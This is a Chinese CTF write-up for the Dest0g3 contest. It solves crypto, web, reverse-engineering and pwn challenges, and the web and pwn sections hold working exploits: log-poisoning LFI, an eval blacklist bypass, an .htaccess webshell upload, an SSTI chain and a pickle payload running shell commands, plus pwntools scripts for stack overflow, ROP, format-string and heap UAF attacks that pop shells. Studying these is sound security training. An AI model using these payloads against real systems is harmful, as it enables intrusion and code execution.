self.sha_flag = [] def encryption(self): for i in range(len(flag) // 4): self.proof.append(flag[4 * i:4 + 4 * i]) self.sha = sha256(self.proof[i]).hexdigest().encode() self.sha_flag.append(bytes_to_long(self.sha)) return self.sha_flagclass RHODES_ELITE: def __init__(self): self.Doctor = getPrime(64) self.Amiya = getRandomNBitInteger(40) self.Rosmontis = getRandomNBitInteger(40) self.Blaze = getRandomNBitInteger(40) self.seed = seed def next(self): self.seed = (self.Amiya * self.seed * self.seed + self.Rosmontis * self.seed + self.Blaze) % self.Doctor return self.seed &gt;&gt; 12 def output(self): print(&quot;Amiya = &quot;, self.Amiya) print(&quot;Rosmontis = &quot;, self.Rosmontis) print(&quot;Blaze = &quot;, self.Blaze) print(&quot;Doctor = &quot;, self.Doctor)sha = SHA256()sha_flag = sha.encryption()elite = RHODES_ELITE()elite.output()print(&quot;Ash = &quot;, elite.next())print(&quot;SliverAsh = &quot;, elite.next())W = b&#x27;&#x27;.join([long_to_bytes(sha_flag[i] % (seed ** 3) ^ (elite.next() % 100)) for i in range(len(sha_flag))])print(bytes_to_long(W))&#x27;&#x27;&#x27;Amiya = 956366446278Rosmontis = 1061992537343Blaze = 636205571590Doctor = 18068433704538283397Ash = 1097363493609113SliverAsh = 20514313441603271920358673646340365826516899186299898354902389402251443712585240681673718967552394250439615271108958695077816395789102908554482423707690040360881719002797624203057223577713119411615697309430781610828105111854807558984242631896605944487456402584672441464316236703857236007195673926937583757881853655505218912262929700452404084&#x27;&#x27;&#x27; 二阶LCG + 4位一轮爆破，用二元Coppersmith方法求seed： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061import itertoolsdef small_roots(f, bounds, m=1, d=None): if not d: d = f.degree() R = f.base_ring() N = R.cardinality() f /= f.coefficients().pop(0) f = f.change_ring(ZZ) G = Sequence([], f.parent()) for i in range(m + 1): base = N ^ (m - i) * f ^ i for shifts in itertools.product(range(d), repeat=f.nvariables()): g = base * prod(map(power, f.variables(), shifts)) G.append(g) B, monomials = G.coefficient_matrix() monomials = vector(monomials) factors = [monomial(*bounds) for monomial in monomials] for i, factor in enumerate(factors): B.rescale_col(i, factor) B = B.dense_matrix().LLL() B = B.change_ring(QQ) for i, factor in enumerate(factors): B.rescale_col(i, 1 / factor) H = Sequence([], f.parent().change_ring(QQ)) for h in filter(None, B * monomials): H.append(h) I = H.ideal() if I.dimension() == -1: H.pop() elif I.dimension() == 0: roots = [] for root in I.variety(ring=ZZ): root = tuple(R(root[var]) for var in f.variables()) roots.append(root) return roots return [] a = 956366446278b = 1061992537343c = 636205571590p = 18068433704538283397state1 = 1097363493609113state2 = 2051431344160327PR.&lt; s1_low, s2_low &gt; = PolynomialRing(Zmod(p))f = a * ((state1 &lt;&lt; 12) + s1_low) ^ 2 + b * ((state1 &lt;&lt; 12) + s1_low) + c - (state2 &lt;&lt; 12) - s2_lowstate1 = small_roots(f, (2 ^ 28, 2 ^ 28), m=3)[0][0] + (state1 &lt;&lt; 12)state2 = small_roots(f, (2 ^ 28, 2 ^ 28), m=3)[0][1] + (state2 &lt;&lt; 12)P.&lt;x&gt; = PolynomialRing(Zmod(p))f = a * x * x + b * x + c - state1seed = f.monic().roots()[1][0]print(seed)# 626844643882 代入逐4位爆破flag： 1234567891011121314151617181920212223242526272829303132333435363738from pwn import *from hashlib import sha256import stringfrom pwnlib.util.iters import mbruteforceclass lcg: def __init__(self): self.p = 18068433704538283397 self.a = 956366446278 self.b = 1061992537343 self.c = 636205571590 self.seed = 626844643882 def next(self): self.seed = (self.a * self.seed * self.seed + self.b * self.seed + self.c) % self.p return self.seed &gt;&gt; 12l = lcg()seed = l.seedl.next()l.next()c = 1920358673646340365826516899186299898354902389402251443712585240681673718967552394250439615271108958695077816395789102908554482423707690040360881719002797624203057223577713119411615697309430781610828105111854807558984242631896605944487456402584672441464316236703857236007195673926937583757881853655505218912262929700452404084c = hex(c)[2:].rjust(9*30,&#x27;0&#x27;)table = &#x27;0123456789abcdef-&#x27;def pow(nowc): print(nowc) t=l.next() print(t) return mbruteforce(lambda x: hex(int(sha256(x).hexdigest().encode(&#x27;hex&#x27;),16)%(seed**3)^(t%100))[2:].rjust(30,&#x27;0&#x27;) == nowc, table, length=4, method=&#x27;fixed&#x27;) flag = &#x27;&#x27;for i in range(9): flag += pow(c[30*i:30*(i+1)])print(flag)# d2a4d1af-8a80-8794-99ac-635f89494cac ​ Bag 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364import gmpy2from Crypto.Util.number import *from secret import flagmessage = bytes_to_long(flag[8:-1])Baglenth=286Bag=[]Bag=Bag[::-1]m=372992427307339981616536686110115630075342113098010788080347982669869622759400031649792w=274062421102700155372289583695782343443assert gmpy2.gcd(m,w)==1h=0j=0if m.bit_length()%2==0: h=m.bit_length() j=int(h//2)else: h=m.bit_length() j=int(h//2+1)def pad(m,lenth): while len(m)&lt;lenth: m=&#x27;0&#x27;+m return mdef keygen(): pk=[] sk=[] sk.append(m) sk.append(int(gmpy2.invert(w,m))) D=[] binD=[] for i in range(Baglenth): di=(w*Bag[i])%m D.append(di) bindi=bin(di)[2:] bindi=pad(bindi,h) binD.append(bindi) U=[] V=[] for i in range(Baglenth): tempu=int(str(binD[i][:j]),2) U.append(tempu) tempv=int(str(binD[i][j:]),2) V.append(tempv) e=gmpy2.next_prime(sum(V))+2 f=gmpy2.next_prime(sum(U)) assert gmpy2.gcd(e,f)==1 sk.append(int(e)) sk.append(int(f)) for i in range(Baglenth): ai=e*U[i]+f*V[i] pk.append(int(ai)) return pk,skPk,Sk=keygen()print(Pk)print(Sk)def Encrypt(plain,pk): mbin=bin(plain)[2:] c=0 mbin=pad(mbin,Baglenth) for i in range(Baglenth): c=c+int(mbin[i])*pk[i] return cc=Encrypt(message,Pk)print(c) 背包密码系统，LLL算法解。 12345678910111213141516171819202122232425262728# Sageimport binasciipubKey = []nbit = len(pubKey)encoded = A = Matrix(ZZ, nbit + 1, nbit + 1)for i in range(nbit): A[i, i] = 1for i in range(nbit): A[i, nbit] = pubKey[i]A[nbit, nbit] = -int(encoded)res = A.LLL()for i in range(0, nbit + 1): M = res.row(i).list() flag = True for m in M: if m != 0 and m != 1: flag = False break if flag: print(i, M) M = &#x27;&#x27;.join(str(j) for j in M) M = M[:-1] M = hex(int(M, 2))[2:] print(bytes.fromhex(M)) b&#x27;5090ea29-8cb6-4ad8-ab43-1e6f65cc8eeb&#x27; ​ WEBphpdest 123456&lt;?phphighlight_file(__FILE__);require_once &#x27;flag.php&#x27;;if(isset($_GET[&#x27;file&#x27;])) &#123; require_once($_GET[&#x27;file&#x27;]);&#125; 文件包含，绕 require_once，burpsuite或 curl -A 修改User-Agent为 &lt;?php show_source(&quot;flag.php&quot;);?&gt;， 然后用日志包含 ?file=/var/log/nginx/access.log 得到flag。 ​ EasyPHP Post something 12345678910111213141516171819&lt;?phphighlight_file(__FILE__);include &quot;fl4g.php&quot;;$dest0g3 = $_POST[&#x27;ctf&#x27;];$time = date(&quot;H&quot;);$timme = date(&quot;d&quot;);$timmme = date(&quot;i&quot;);if(($time &gt; &quot;24&quot;) or ($timme &gt; &quot;31&quot;) or ($timmme &gt; &quot;60&quot;))&#123; echo $fl4g;&#125;else&#123; echo &quot;Try harder!&quot;;&#125;set_error_handler( function() use(&amp;$fl4g) &#123; print $fl4g; &#125;);$fl4g .= $dest0g3;?&gt; 异常处理函数 use() 中输出flag，传参时传入数组即可触发异常：ctf[]=1。 ​ SimpleRCE 1234567&lt;?phphighlight_file(__FILE__);$aaa=$_POST[&#x27;aaa&#x27;];$black_list=array(&#x27;^&#x27;,&#x27;.&#x27;,&#x27;`&#x27;,&#x27;&gt;&#x27;,&#x27;&lt;&#x27;,&#x27;=&#x27;,&#x27;&quot;&#x27;,&#x27;preg&#x27;,&#x27;&amp;&#x27;,&#x27;|&#x27;,&#x27;%0&#x27;,&#x27;popen&#x27;,&#x27;char&#x27;,&#x27;decode&#x27;,&#x27;html&#x27;,&#x27;md5&#x27;,&#x27;&#123;&#x27;,&#x27;&#125;&#x27;,&#x27;post&#x27;,&#x27;get&#x27;,&#x27;file&#x27;,&#x27;ascii&#x27;,&#x27;eval&#x27;,&#x27;replace&#x27;,&#x27;assert&#x27;,&#x27;exec&#x27;,&#x27;$&#x27;,&#x27;include&#x27;,&#x27;var&#x27;,&#x27;pastre&#x27;,&#x27;print&#x27;,&#x27;tail&#x27;,&#x27;sed&#x27;,&#x27;pcre&#x27;,&#x27;flag&#x27;,&#x27;scan&#x27;,&#x27;decode&#x27;,&#x27;system&#x27;,&#x27;func&#x27;,&#x27;diff&#x27;,&#x27;ini_&#x27;,&#x27;passthru&#x27;,&#x27;pcntl&#x27;,&#x27;proc_open&#x27;,&#x27;+&#x27;,&#x27;cat&#x27;,&#x27;tac&#x27;,&#x27;more&#x27;,&#x27;sort&#x27;,&#x27;log&#x27;,&#x27;current&#x27;,&#x27;\\\\&#x27;,&#x27;cut&#x27;,&#x27;bash&#x27;,&#x27;nl&#x27;,&#x27;wget&#x27;,&#x27;vi&#x27;,&#x27;grep&#x27;);$aaa = str_ireplace($black_list,&quot;hacker&quot;,$aaa);eval($aaa);?&gt; 黑名单绕过rce，用16进制编码绕过：aaa=hex2bin(&#39;73797374656d&#39;)(&#39;uniq /f*&#39;); ​ funny_upload文件上传后缀白名单绕过，利用.htaccess文件实现非PHP文件解析成PHP代码执行。 先上传 .htaccess 文件，由于文件中不能包含 &lt;? ，用PHP伪协议base64解码处理： 12AddType application/x-httpd-php .xxxphp_value auto_append_file &quot;php://filter/convert.base64-decode/resource=shell.xxx&quot; 再上传base64编码后的 shell.xxx 文件： 1PD9waHAgcHJpbnRfcihmaWxlX2dldF9jb250ZW50cygnL2ZsYWcnKSk7 访问 shell.xxx，其中内容 &lt;?php print_r(file_get_contents(&#39;/flag&#39;)); 以PHP代码执行，得到flag。 ​ EasySSTI登录框随便输入账号密码，进入 Hello xxx 界面，尝试更换账号为 &#123;&#123;2*3&#125;&#125;，出现 Hello 6，可利用SSTI注入rce。 Fuzz发现过滤了很多符号，包括 request _ &#39; &quot; [ . 空格 class getitem import 等，不过 config 可用，可从 &#123;&#123;config&#125;&#125; 内容字符串中找到所需字符来拼接构造字符串，可以避免用到引号；过滤的关键词使用 dict(cla=aa,ss=bb)|join() 形式绕过： 123456789101112131415# _config|list()|last()|string()|list()|attr(dict(p=aa,op=bb)|join())(3)# 空格config|string()|list()|attr(dict(p=aa,op=bb)|join())(7)# /config|string()|list()|attr(dict(p=aa,op=bb)|join())(279)# __class__(config|list()|last()|string()|list()|attr(dict(p=aa,op=bb)|join())(3))*2+dict(cla=aa,ss=bb)|join()+(config|list()|last()|string()|list()|attr(dict(p=aa,op=bb)|join())(3))*2# config.__class__.__init__.__globals__config|attr((config|list()|last()|string()|list()|attr(dict(p=aa,op=bb)|join())(3))*2+dict(cla=aa,ss=bb)|join()+(config|list()|last()|string()|list()|attr(dict(p=aa,op=bb)|join())(3))*2)|attr((config|list()|last()|string()|list()|attr(dict(p=aa,op=bb)|join())(3))*2+dict(in=aa,it=bb)|join()+(config|list()|last()|string()|list()|attr(dict(p=aa,op=bb)|join())(3))*2)|attr((config|list()|last()|string()|list()|attr(dict(p=aa,op=bb)|join())(3))*2+dict(glo=aa,bals=bb)|join()+(config|list()|last()|string()|list()|attr(dict(p=aa,op=bb)|join())(3))*2)#config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag&#x27;).read()config|attr((config|list()|last()|string()|list()|attr(dict(p=aa,op=bb)|join())(3))*2+dict(cla=aa,ss=bb)|join()+(config|list()|last()|string()|list()|attr(dict(p=aa,op=bb)|join())(3))*2)|attr((config|list()|last()|string()|list()|attr(dict(p=aa,op=bb)|join())(3))*2+dict(in=aa,it=bb)|join()+(config|list()|last()|string()|list()|attr(dict(p=aa,op=bb)|join())(3))*2)|attr((config|list()|last()|string()|list()|attr(dict(p=aa,op=bb)|join())(3))*2+dict(glo=aa,bals=bb)|join()+(config|list()|last()|string()|list()|attr(dict(p=aa,op=bb)|join())(3))*2)|attr((config|list()|last()|string()|list()|attr(dict(p=aa,op=bb)|join())(3))*2+dict(geti=aa,tem=bb)|join()+(config|list()|last()|string()|list()|attr(dict(p=aa,op=bb)|join())(3))*2)(dict(o=aa,s=bb)|join())|attr(dict(po=aa,pen=bb)|join())(dict(c=aa,at=bb)|join()+config|string()|list()|attr(dict(p=aa,op=bb)|join())(7)+config|string()|list()|attr(dict(p=aa,op=bb)|join())(279)+dict(fl=aa,ag=bb)|join())|attr(dict(re=aa,ad=bb)|join())() ​ middle 1234567891011121314151617181920212223242526272829303132333435363738394041424344import osimport configfrom flask import Flask, request, session, render_template, url_for,redirect,make_responseimport pickleimport ioimport sysimport base64app = Flask(__name__)class RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): if module in [&#x27;config&#x27;] and &quot;__&quot; not in name: return getattr(sys.modules[module], name) raise pickle.UnpicklingError(&quot;global &#x27;%s.%s&#x27; is forbidden&quot; % (module, name))def restricted_loads(s): return RestrictedUnpickler(io.BytesIO(s)).load()@app.route(&#x27;/&#x27;)def show(): base_dir = os.path.dirname(__file__) resp = make_response(open(os.path.join(base_dir, __file__)).read()+open(os.path.join(base_dir, &quot;config/__init__.py&quot;)).read()) resp.headers[&quot;Content-type&quot;] = &quot;text/plain;charset=UTF-8&quot; return resp@app.route(&#x27;/home&#x27;, methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])def home(): data=request.form[&#x27;data&#x27;] User = restricted_loads(base64.b64decode(data)) return str(User)if __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;, debug=True, port=5000)import osdef backdoor(cmd): # 这里我也改了一下 if isinstance(cmd,list) : s=&#x27;&#x27;.join(cmd) print(&quot;!!!!!!!!!!&quot;) s=eval(s) return s else: print(&quot;??????&quot;) flask框架，用到python反序列化，参考巅峰极客2021 - what_pickle，限制了加载的模块只能为 config 里的，名字不能有 __，但是可以通过 config 的 backdoor(cmd) 函数绕过。 这题简化了 backdoor(cmd) 函数的使用条件，直接调用即可。利用pker构造opcode： 1234b&#x27;&#x27;&#x27;(cconfigbackdoor(S&#x27;__import__(&quot;os&quot;).popen(&quot;cat /flag.txt&quot;).read()&#x27;lo.&#x27;&#x27;&#x27; base64编码opcode，传参： data=KGNjb25maWcKYmFja2Rvb3IKKFMnX19pbXBvcnRfXygib3MiKS5wb3BlbigiY2F0IC9mbGFnLnR4dCIpLnJlYWQoKScKbG8u ​ REVERSEsimpleXOR 简单的加密 main() 代码： 12345678910111213141516171819202122232425262728int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4[72]; // [rsp+0h] [rbp-160h] char v5[52]; // [rsp+120h] [rbp-40h] BYREF int v6; // [rsp+154h] [rbp-Ch] unsigned int j; // [rsp+158h] [rbp-8h] int i; // [rsp+15Ch] [rbp-4h] v6 = 247; printf(&quot;input flag:&quot;); __isoc99_scanf(&quot;%s&quot;, v5); for ( i = 0; i &lt;= 35; ++i ) &#123; v4[i + 36] = v5[i]; v4[i] = v6 ^ (v4[i + 36] + i); &#125; for ( j = 0; j &lt;= 0x23; ++j ) &#123; if ( v4[j] != result_0[j] ) &#123; puts(&quot;Wrong!!!&quot;); return 0; &#125; if ( j == 35 ) puts(&quot;Success!!!&quot;); &#125; return 0;&#125; 先加下标值再异或247，最后校验密文，简单还原： 12345c = [179, 145, 130, 128, 195, 155, 206, 117, 207, 156, 154, 133, 133, 205, 184, 132, 170, 125, 189, 187, 177, 181, 150, 113, 141, 158, 134, 191, 115, 168, 163, 156, 131, 101, 158, 87]flag = [(c[i]^247)-i for i in range(len(c))]print(bytes(flag))# b&#x27;Dest0g3&#123;0bcgf-AdMy892-KobPW-hB6LTqG&#125;&#x27; ​ himain() 代码： 123456789101112131415161718192021222324252627282930int __cdecl main(int argc, const char **argv, const char **envp)&#123; int i; // [rsp+4h] [rbp-ACh] int v1; // [rsp+8h] [rbp-A8h] char enc[45]; // [rsp+10h] [rbp-A0h] char str[100]; // [rsp+40h] [rbp-70h] BYREF unsigned __int64 v8; // [rsp+A8h] [rbp-8h] v8 = __readfsqword(0x28u); memset(str, 0, sizeof(str)); *(_QWORD *)enc = 0x9F8E7A1CC6486497LL; *(_QWORD *)&amp;enc[8] = 0x69EEF382E760BD46LL; *(_QWORD *)&amp;enc[16] = 0xB9C017E2E30EF749LL; *(_QWORD *)&amp;enc[24] = 0x98410148A430392CLL; *(_QWORD *)&amp;enc[32] = 0xE80E7411E5B5A939LL; *(_DWORD *)&amp;enc[40] = 0xA58BFDAC; enc[44] = 109; fwrite(&quot;input: &quot;, 1uLL, 7uLL, stdout); fgets(str, 46, stdin); if ( strlen(str) != 45 ) exit(0); for ( i = 0; i &lt;= 44; ++i ) &#123; v1 = 23 * str[i]; if ( ((unsigned int)((v1 + x[i]) &gt;&gt; 31) &gt;&gt; 24) + (_BYTE)v1 + x[i] - ((unsigned int)((v1 + x[i]) &gt;&gt; 31) &gt;&gt; 24) != enc[i] ) exit(0); &#125; puts(&quot;good!&quot;); return 0;&#125; 加密逻辑中 ((v1 + x[i]) &gt;&gt; 31) &gt;&gt; 24) 互减抵消，剩下 23 * str[i] + x[i] == enc[i]，简单还原： 1234567import gmpy2enc = [151, 100, 72, 198, 28, 122, 142, 159, 70, 189, 96, 231, 130, 243, 238, 105, 73, 247, 14, 227, 226, 23, 192, 185, 44, 57, 48, 164, 72, 1, 65, 152, 57, 169, 181, 229, 17, 116, 14, 232, 172, 253, 139, 165, 109]x = [123, 81, 243, 90, 204, 57, 249, 146, 28, 158, 88, 105, 157, 247, 253, 74, 62, 251, 29, 44, 77, 12, 112, 177, 59, 141, 37, 237, 145, 177, 115, 141, 130, 230, 231, 80, 32, 97, 98, 60, 0, 58, 166, 157, 50]flag = [((enc[i]-x[i])*gmpy2.invert(23,256))%256 for i in range(len(enc))]print(bytes(flag))# b&#x27;Dest0g3&#123;f982cd79-d7a3-0874-aa0b-a5b37e4445c8&#125;&#x27; ​ EZMATHILSpy查看dll文件，主要逻辑代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859private static void &lt;Main&gt;$(string[] args)&#123; Console.Write(&quot;Input your flag:&quot;); string text = Console.ReadLine(); if (!FormatChecker(text)) &#123; err(); &#125; string s = text.Replace(&quot;-&quot;, string.Empty); byte[] second = Checker.Encrypt2(Checker.Encrypt1(Encoding.ASCII.GetBytes(s))); if (new byte[32] &#123; 218, 49, 230, 35, 65, 168, 134, 53, 233, 62, 212, 208, 127, 224, 63, 164, 36, 88, 65, 138, 118, 255, 107, 22, 16, 239, 61, 58, 130, 101, 227, 109 &#125;.SequenceEqual(second)) &#123; Console.WriteLine(&quot;right!&quot;); Console.WriteLine(&quot;Your flag is Dest0g3&#123;&quot; + text + &quot;&#125;&quot;); &#125; else &#123; err(); &#125; static void err() &#123; Console.WriteLine(&quot;err!&quot;); Environment.Exit(1); &#125; static bool FormatChecker(string input) &#123; Guid result; return Guid.TryParse(input, out result); &#125;&#125;public static byte[] Encrypt1(byte[] a)&#123; List&lt;byte&gt; list = new List&lt;byte&gt;(); for (int i = 0; i &lt; 8; i++) &#123; uint value = (uint)((ulong)((long)utils.Unpack32(a[(4 * i)..(4 * (i + 1))]) * 83987L) % 4062393413uL); list.AddRange(BitConverter.GetBytes(value)); &#125; return list.ToArray();&#125;public static byte[] Encrypt2(byte[] a)&#123; List&lt;byte&gt; list = new List&lt;byte&gt;(); for (int i = 0; i &lt; 4; i++) &#123; ulong num = utils.Unpack64(a[(8 * i)..(8 * (i + 1))]); ulong value = num ^ (num &gt;&gt; 25); list.AddRange(BitConverter.GetBytes(value)); &#125; return list.ToArray();&#125; 输入字符串先经 Encrypt1() 以32位形式4位一组做乘法取模运算，再经 Encrypt2() 以64位形式8位一组做xorshift运算，逐步还原： 12345678910111213141516171819202122232425262728293031323334from Crypto.Util.number import *c = [218, 49, 230, 35, 65, 168, 134, 53, 233, 62, 212, 208, 127, 224, 63, 164, 36, 88, 65, 138, 118, 255, 107, 22, 16, 239, 61, 58, 130, 101, 227, 109]c1 = [bytes_to_long(bytes(c[8*i:8*(i+1)])[::-1]) for i in range(4)]def invert_right(m,l): length = 64 mx = (1 &lt;&lt; 64) - 1 i,res = 0,0 while i * l &lt; length: mask = (mx &lt;&lt; (length - l) &amp; mx) &gt;&gt; i * l tmp = m &amp; mask m = m ^ tmp &gt;&gt; l &amp; mx res += tmp i += 1 return resc2 = [invert_right(c1[i], 25) for i in range(4)]c3 = []for i in range(4): c3 += list(long_to_bytes(c2[i]))[::-1]c4 = [bytes_to_long(bytes(c3[4*i:4*(i+1)])[::-1]) for i in range(8)]c4 = [(k*inverse(83987,4062393413))%4062393413 for k in c4]c5 = []for i in range(8): c5 += list(long_to_bytes(c4[i]))[::-1]print(bytes(c5))# b&#x27;28956fc4c54045a8808d42a5fab4b5f8&#x27; ​ PWNez_aarch主要代码： 123456789101112131415161718192021222324int __cdecl main(int argc, const char **argv, const char **envp)&#123; sub_8EC(); func(); return 0;&#125;__int64 func()&#123; puts(&quot;It&#x27;s just a easy stack overflow.&quot;); return fun2();&#125;__int64 fun2()&#123; char buf; // [xsp+10h] [xbp+10h] BYREF puts(&quot;Please leave your name:&quot;); read(0, &amp;buf, 0x30uLL); return puts(&quot;OK, you can exploit it now.&quot;);&#125;__int64 backdoor()&#123; puts(&quot;OK, you get it !&quot;); return system(&quot;/bin/sh&quot;);&#125; arm的aarch64架构，开了PIE，与后门地址比较发现只有后1个字节不同，把返回地址的尾1字节改为后门地址尾1字节，简单栈溢出： 12345678from pwn import *r = remote(&#x27;node4.buuoj.cn&#x27;, 26257)r.recvline()r.send(&#x27;a&#x27;*(0x30-0x08) + &#x27;\\x3c&#x27;)r.interactive() ​ ez_pwn主要代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859int hackme()&#123; int v1[10]; // [esp+4h] [ebp-44h] BYREF unsigned int v2; // [esp+2Ch] [ebp-1Ch] BYREF int v3; // [esp+30h] [ebp-18h] BYREF unsigned int v4; // [esp+34h] [ebp-14h] unsigned int i; // [esp+38h] [ebp-10h] unsigned int v6; // [esp+3Ch] [ebp-Ch] v6 = 0; v4 = 0; puts(&quot;input the length of array:&quot;); __isoc99_scanf(&quot;%d&quot;, &amp;v2); if ( (int)abs32(v2) &gt; 10 ) &#123; puts(&quot;array is too long!&quot;); exit(0); &#125; while ( 1 ) &#123; while ( 1 ) &#123; puts(&quot;\\n\\n----------------------------------------------------&quot;); puts(&quot;choice:\\n1.add num\\n2.get sum\\n3.get avg\\n4.exit&quot;); puts(&quot;----------------------------------------------------\\n&quot;); puts(&quot;input your choice:&quot;); __isoc99_scanf(&quot;%d&quot;, &amp;v3); if ( v3 != 3 ) break; if ( v4 ) printf(&quot;avg = %d\\n&quot;, v6 / v4); else puts(&quot;no avg!\\n&quot;); &#125; if ( v3 &gt; 3 ) break; if ( v3 == 1 ) &#123; if ( v4 &gt;= v2 ) &#123; puts(&quot;array is too long!&quot;); exit(0); &#125; puts(&quot;input num&quot;); __isoc99_scanf(&quot;%d&quot;, &amp;v1[v4++]); &#125; else &#123; if ( v3 != 2 ) break; v6 = 0; for ( i = 0; v4 &gt; i; ++i ) v6 += v1[i]; printf(&quot;sum = %d\\n&quot;, v6); &#125; &#125; puts(&quot;exit!&quot;); return 0;&#125; 开始的 scanf 处未检查输入，读入负数可致负溢出，再结合写入数据的第二个 scanf， 可以越栈一直写，最后利用ROP修改返回地址，第一次ROP求libc基地址，第二次ROP可getshell： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546from pwn import *r = remote(&#x27;node4.buuoj.cn&#x27;, 28547)elf = ELF(&#x27;./ez_pwn&#x27;)def add(n): r.sendlineafter(&#x27;input your choice:&#x27;, &#x27;1&#x27;) r.sendlineafter(&#x27;input num&#x27;, str(n))puts_plt = elf.plt.putsputs_got = elf.got.putshackme_addr = elf.sym.hackmer.recvuntil(&#x27;length of array:&#x27;)r.sendline(&#x27;-2147483648&#x27;)for i in range(10): add(1)add(1000)add(1)add(17)add(puts_plt)add(hackme_addr)add(puts_got)r.sendlineafter(&#x27;input your choice:&#x27;, &#x27;4&#x27;)r.recvuntil(&#x27;exit!\\n&#x27;)puts_addr = u32(r.recv(4))libc_base = puts_addr - 0x67560system_addr = libc_base + 0x3cf10binsh_addr = libc_base + 0x17b9dbr.recvuntil(&#x27;length of array:&#x27;)r.sendline(&#x27;-2147483648&#x27;)for i in range(10): add(1)add(1000)add(1)add(17)add(signed(system_addr))add(hackme_addr)add(signed(binsh_addr))r.sendlineafter(&#x27;input your choice:&#x27;, &#x27;4&#x27;)r.interactive() ​ dest_love主要代码： 123456789101112131415161718192021222324__int64 __fastcall main(int a1, char **a2, char **a3)&#123; __int64 i; // [rsp+0h] [rbp-10h] setbuf(stdin, 0LL); setbuf(stdout, 0LL); setbuf(stderr, 0LL); for ( i = 0LL; i &lt;= 5; ++i ) &#123; puts(&quot;What about your love to Dest0g3?&quot;); read(0, format, 0x40uLL); printf(format); &#125; if ( dword_4010 == 1314520 ) &#123; puts(&quot;I can feel your love!&quot;); system(&quot;/bin/sh&quot;); &#125; else &#123; puts(&quot;Your dont love Dest0g3 at all!&quot;); &#125; return 0LL;&#125; 格式化字符串漏洞，需要改写值的串在bss段里。 123456789101112131415161718192021from pwn import *r = remote(&#x27;node4.buuoj.cn&#x27;,29044)e = ELF(&#x27;./pwn&#x27;)r.sendafter(b&#x27;What about your love to Dest0g3?\\n&#x27;,b&#x27;aaa&#x27;)r.sendafter(b&#x27;What about your love to Dest0g3?\\n&#x27;,b&#x27;aaa&#x27;)r.sendafter(b&#x27;What about your love to Dest0g3?\\n&#x27;,b&#x27;%12$p%10$p&#x27;)base = int(r.recv(14),16) - 0x1185stack = int(r.recv(14),16) - 0xd8print(hex(stack))r.sendafter(b&#x27;What about your love to Dest0g3?\\n&#x27;,&#x27;%&#123;&#125;c%10$hn&#x27;.format(stack % 0x10000))target = base + 0x4010r.sendafter(b&#x27;What about your love to Dest0g3?\\n&#x27;,&#x27;%&#123;&#125;c%39$hn&#x27;.format(target % 0x10000))r.sendafter(b&#x27;What about your love to Dest0g3?\\n&#x27;,&#x27;%1314520c%12$n&#x27;)r.interactive() ​ ezuaf主要代码： 1234567891011121314151617181920212223242526272829303132333435363738394041void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&#123; int v3; // [rsp+Ch] [rbp-114h] sub_11C5(a1, a2, a3); while ( 1 ) &#123; menu(); v3 = read_n(); switch ( v3 ) &#123; case 1: add(); break; case 2: edit(); break; case 3: delete(); break; case 4: show(); break; default: puts(&quot;Invaild Choice!&quot;); break; &#125; &#125;&#125;void delete()&#123; signed int v0; // [rsp+Ch] [rbp-4h] puts(&quot;Please tell me the index: &quot;); v0 = read_n(); if ( *((_QWORD *)&amp;unk_40C0 + v0) &amp;&amp; (unsigned int)v0 &lt;= 0xF ) free(*((void **)&amp;unk_40C0 + v0)); else puts(&quot;Invalid Index!&quot;);&#125; 高版本（2.33）的UAF漏洞利用，在tcache里写入__free_hook，再写入system。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758from pwn import *r = remote(&#x27;node4.buuoj.cn&#x27;,26427)libc = ELF(&#x27;./libc-2.33.so&#x27;)def add(size,content): r.sendlineafter(&#x27;4. show\\n: &#x27;,&#x27;1&#x27;) r.sendlineafter(&#x27;Please tell me its size: &#x27;,str(size)) r.sendafter(&#x27;Content: &#x27;,content) def edit(idx,content): r.sendlineafter(&#x27;4. show\\n: &#x27;,&#x27;2&#x27;) r.sendlineafter(&#x27;Please tell me the index: &#x27;,str(idx)) r.sendafter(&#x27;Please tell me its content: &#x27;,content)def delete(idx): r.sendlineafter(&#x27;4. show\\n: &#x27;,&#x27;3&#x27;) r.sendlineafter(&#x27;Please tell me the index: &#x27;,str(idx)) def show(idx): r.sendlineafter(&#x27;4. show\\n: &#x27;,&#x27;4&#x27;) r.sendlineafter(&#x27;Please tell me the index: \\n&#x27;,str(idx))add(0x7f,&#x27;a&#x27;)add(0x40,&#x27;a&#x27;)add(0x40,&#x27;a&#x27;)add(0x50,&#x27;/bin/sh&#x27;)for i in range(7): delete(0) edit(0,p64(0)*2+&#x27;\\n&#x27;) delete(0)show(0)libc_base = u64(r.recv(6).ljust(8,&#x27;\\x00&#x27;))-0x1e0c00#print(hex(libc_base))delete(2)show(2)heap_addr1 = ((u64(r.recv(8)) &lt;&lt; 12) % (2**64)) + 0x380#print(hex(heap_addr1))delete(1)show(1)free_hook = libc_base + libc.sym.__free_hook#print(hex(free_hook))heap_addr2 = (((u64(r.recv(8)) ^ heap_addr1) &lt;&lt; 12) % (2**64)) + 0x330#print(hex(heap_addr2))next = ((heap_addr2 &gt;&gt; 12) % (2**64)) ^ free_hookedit(1,p64(next)+&#x27;\\n&#x27;)add(0x40,&#x27;a&#x27;)system_addr = libc_base + libc.sym.system#print(hex(system_addr))add(0x40,p64(system_addr))delete(3)r.interactive() ​ emma主要代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107void __fastcall __noreturn main(const char *a1, char **a2, char **a3)&#123; int v3; // eax init_0(); while ( 1 ) &#123; while ( 1 ) &#123; menu(); read_n(); if ( v3 != 4 ) break; delete(a1, a2); &#125; if ( v3 &gt; 4 ) &#123;LABEL_12: a1 = &quot;Invaild Choice!&quot;; puts(&quot;Invaild Choice!&quot;); &#125; else &#123; switch ( v3 ) &#123; case 3: show(a1, a2); break; case 1: add(a1, a2); break; case 2: edit(a1, a2); break; default: 